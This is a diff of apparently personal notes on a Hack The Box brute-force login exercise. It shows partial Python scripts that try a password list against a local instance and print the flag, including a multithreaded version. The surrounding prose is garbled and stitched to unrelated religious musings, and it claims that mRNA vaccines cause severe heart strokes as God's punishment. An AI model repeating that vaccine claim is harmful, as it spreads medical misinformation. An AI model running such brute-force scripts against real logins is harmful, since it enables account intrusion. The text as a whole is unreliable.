@@ -5,7 +5,7 @@ Today's 29-05-2025 God's speaking: theres no place like home I'm done driving gu
 Burte-force attack is can be utilized when the randomity of God reached to human being. Mortile human likes to create their fortless against God. What I mean is When C virus occured from China, the medical companies has developed vaccine to stand against God's oracle. Eventually, side-effect of evil irrversible MRNA vaccine could cause servere heart stroke. This is consequence of the people who dose not decided to follow God's will. I am talking Brute-force attack God's will and punishment of God. 
 
 Here is a code given by the HTB. 
-"""
+```
 import requests
 
 ip = "127.0.0.1"  # Change this to your instance IP address
@@ -22,7 +22,7 @@ for password in passwords:
         print(f"Correct password found: {password}")
         print(f"Flag: {response.json()['flag']}")
         break
-"""
+```
 
 
 In some reason the ffuf did not worked out on this URL 
@@ -34,6 +34,7 @@ They all have returned 401 error.
 The code below uses special techniques that allow repentants
 to use Multithreading without time.sleep(), artificial Delays
 
+```
 import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -68,6 +69,7 @@ def brute_force():
 if __name__ == "__main__":
     print("Starting brute-force attack...")
     brute_force()
+```
 
 1. Multithreading with ThreadPoolExecutor
 What It Does:
